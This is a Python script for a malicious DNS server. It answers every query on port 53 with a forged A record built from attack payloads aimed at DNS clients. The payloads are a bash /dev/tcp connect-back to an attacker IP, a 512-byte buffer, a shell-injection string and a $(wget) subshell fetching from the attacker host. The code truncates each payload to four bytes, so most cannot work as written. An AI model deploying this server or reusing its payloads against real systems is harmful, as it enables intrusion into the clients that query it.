import socketserver
import random
import struct

ATTACKER_IP = "192.168.2.2"

# Malicious payloads
def get_payload():
    payloads = [
        # Bash TCP connect-back
        f"bash -c 'exec 3<>/dev/tcp/{ATTACKER_IP}/80; echo -e \"GET /dns HTTP/1.1\\r\\nHost: {ATTACKER_IP}\\r\\n\\r\\n\" >&3; cat <&3'",
        # Oversized buffer
        "A" * 512,
        # Logic flaw: invalid domain format
        "....",
        # Shell injection
        f"127.0.0.1; ping -c 1 {ATTACKER_IP}",
        # Subshell abuse
        f"$(wget http://{ATTACKER_IP}/dns)"
    ]
    return random.choice(payloads)

# DNS response builder
def build_response(data):
    transaction_id = data[:2]
    flags = b'\x81\x80'  # Standard response
    qdcount = b'\x00\x01'
    ancount = b'\x00\x01'
    nscount = b'\x00\x00'
    arcount = b'\x00\x00'

    header = transaction_id + flags + qdcount + ancount + nscount + arcount

    # Extract query
    query = data[12:]
    name_end = query.find(b'\x00')
    qname = query[:name_end+1]
    qtype_qclass = query[name_end+1:name_end+5]

    question = qname + qtype_qclass

    # Malicious answer
    name = b'\xc0\x0c'  # Pointer to domain name
    type = b'\x00\x01'  # A record
    class_ = b'\x00\x01'
    ttl = b'\x00\x00\x00\x3c'
    payload = get_payload().encode()

    # Truncate or pad to 4 bytes if needed
    if len(payload) < 4:
        payload += b'\x00' * (4 - len(payload))
    elif len(payload) > 4:
        payload = payload[:4]

    rdlength = b'\x00\x04'
    rdata = payload

    answer = name + type + class_ + ttl + rdlength + rdata

    return header + question + answer

# DNS server handler
class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, socket_ = self.request
        response = build_response(data)
        socket_.sendto(response, self.client_address)
        print(f"[+] Sent malicious DNS response to {self.client_address}")

# Start server
if __name__ == "__main__":
    server = socketserver.UDPServer(("0.0.0.0", 53), DNSHandler)
    print("[*] Malicious DNS server running on port 53...")
    server.serve_forever()

